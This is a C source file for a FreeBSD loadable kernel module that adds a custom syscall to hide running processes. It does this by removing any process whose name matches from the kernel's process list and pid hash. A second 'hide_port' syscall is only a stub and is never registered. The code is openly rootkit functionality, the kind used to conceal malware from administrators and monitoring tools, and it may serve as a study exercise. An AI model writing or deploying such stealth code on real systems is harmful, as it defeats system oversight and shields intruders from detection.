#include <sys/types.h>
#include <sys/param.h>
#include <sys/proc.h>
#include <sys/module.h>
#include <sys/sysent.h>
#include <sys/kernel.h>
#include <sys/systm.h>
#include <sys/queue.h>
#include <sys/lock.h>
#include <sys/sx.h>
#include <sys/mutex.h>
#include <sys/sysproto.h>

typedef struct process_hiding_args {
	char *p_comm;
} process_hiding_args;



char buf[MAXCOMLEN +1];

// We're making a new custom syscall!
static int hide_process(struct thread *td, void *syscall_args)
{
	process_hiding_args *uap;	
	uap = (process_hiding_args *)syscall_args;

	size_t done;
	copyinstr(uap->p_comm, buf, MAXCOMLEN, &done);

	struct proc *p;
	sx_xlock(&allproc_lock);

	LIST_FOREACH(p, &allproc, p_list) 
	{
		PROC_LOCK(p);
		if (!p->p_vmspace || (p->p_flag & P_WEXIT)) 
		{
			uprintf("%s\n", p->p_comm);
			PROC_UNLOCK(p);
			continue;
		}

		if (strncmp(p->p_comm, buf, MAXCOMLEN) == 0)
		{
			LIST_REMOVE(p, p_list);
			LIST_REMOVE(p, p_hash);
		}

		PROC_UNLOCK(p);
	}

	sx_xunlock(&allproc_lock);

	return 0;
}

static struct sysent process_hiding_sysent = {
	1, // Arg count
	hide_process // func_pointer
};

typedef struct port_hiding_args {
	u_int16_t l_port;
	u_int16_t l_address;
} port_hiding_args;

static int hide_port(struct thread *td, void *syscall_args)
{
	port_hiding_args *uap;
	uap = (port_hiding_args *)syscall_args;

	uprintf("%d\n", uap->l_port);

	return 0;
}

static struct sysent port_hiding_sysent = {
	2, // Arg count
	hide_port // func_pointer
};

static int offset = NO_SYSCALL;
static int sec_off = 0;

static int load(struct module *module, int cmd, void *arg)
{
	int error = 0;
	
	switch (cmd) {
	case MOD_LOAD:
		uprintf("New syscall %d\n", offset);
		uprintf("New syscall %d\n", sec_off);
		break;
	
	case MOD_UNLOAD:
		break;

	default:
		error = EOPNOTSUPP;
		break;

	}

	return(error);
}


SYSCALL_MODULE(hiding, &offset, &process_hiding_sysent, load, NULL);
